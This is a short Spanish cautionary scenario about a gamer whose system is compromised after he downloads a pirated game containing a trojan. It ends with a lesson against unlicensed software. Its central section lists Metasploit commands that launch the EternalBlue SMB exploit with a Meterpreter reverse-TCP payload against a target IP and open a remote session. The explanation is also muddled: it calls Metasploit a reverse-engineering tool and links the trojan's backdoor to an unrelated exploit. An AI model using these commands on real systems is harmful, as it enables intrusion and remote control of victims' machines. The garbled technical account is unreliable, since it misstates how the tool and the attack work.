Escenario: Ingeniería Inversa en Acción


El Inicio del Incidente

Conozcamos a Juan, un apasionado jugador de videojuegos que decidió descargar un juego pirata desde un sitio web no confiable. Lo que Juan no sabía es que ese juego contenía un troyano malicioso.

El troyano se ejecuta en el sistema de Juan, creando una puerta trasera y proporcionando acceso al atacante. El atacante utiliza Metasploit, una herramienta de ingeniería inversa, para aprovechar esta puerta trasera y tomar el control del sistema de Juan.


La Serie de Comandos del Atacante

A continuación, se muestran los comandos que el atacante podría utilizar para explotar el sistema de Juan:


        
        
        # Inicia Metasploit
        msfconsole 
        

        # Selecciona el exploit EternalBlue
        use exploit/windows/smb/ms17_010_eternalblue    
        

        # Establece la IP de Juan
        set RHOSTS 192.168.1.100 
        
 
        # Configura la carga útil
        set payload windows/meterpreter/reverse_tcp
        
  
        # Ejecuta el exploit  
        exploit 
        
     
        # Abre la sesión interactiva                 
        sessions -i 1

Una vez que el atacante tiene acceso al sistema de Juan, puede realizar acciones maliciosas, como exfiltrar datos, instalar malware adicional o controlar el sistema de forma remota. El sistema de Juan ha sido comprometido debido a la descarga de software pirata no confiable.


Lección Aprendida

Si hay algo que podemos aprender hoy en dia de internet es que hay pocas cosas que son gratis , no olvidemos que despues de todo , nosotros somos el producto de alguien y aunque no se le quiera quitar merito y verdad a las comunidades con buenas intenciones en la interaccion y transferencia de software no licenciado no siempre es correcto incurrir en estas practicas.
